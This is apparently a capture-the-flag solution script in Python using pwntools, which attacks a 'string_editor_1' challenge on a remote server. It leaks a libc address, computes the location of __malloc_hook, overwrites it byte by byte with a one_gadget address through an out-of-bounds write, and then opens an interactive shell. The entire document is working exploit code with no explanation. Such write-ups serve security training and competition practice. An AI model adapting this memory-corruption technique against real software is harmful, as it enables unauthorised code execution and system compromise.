
from pwn import *

r = remote('chal.imaginaryctf.org', 42004)
libc = ELF('./libc.so.6', checksec=False)

# r = process('./string_editor_1')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)


system = libc.sym['system']
hook = libc.sym['__malloc_hook']

r.readline()
r.readline()
leak = int(r.readline().split()[-1], 16) - system

hook_addr = leak + hook

r.recvuntil(b'pallette)\n')
r.sendline('15')
r.readline()
r.sendline('1')
leak_add = int(r.readline().split()[-1], 16)

tab_addr = hook_addr - leak_add + 15

one_gadget = 0xe6c81 + leak

p = (one_gadget).to_bytes(6, byteorder='little')

for i in range(len(p)):
    r.recvuntil(b'pallette)\n')
    r.sendline(str(tab_addr+i))
    r.readline()
    r.sendline(p8(p[i]))

r.recvuntil(b'pallette)\n')
r.sendline('15')

r.interactive()

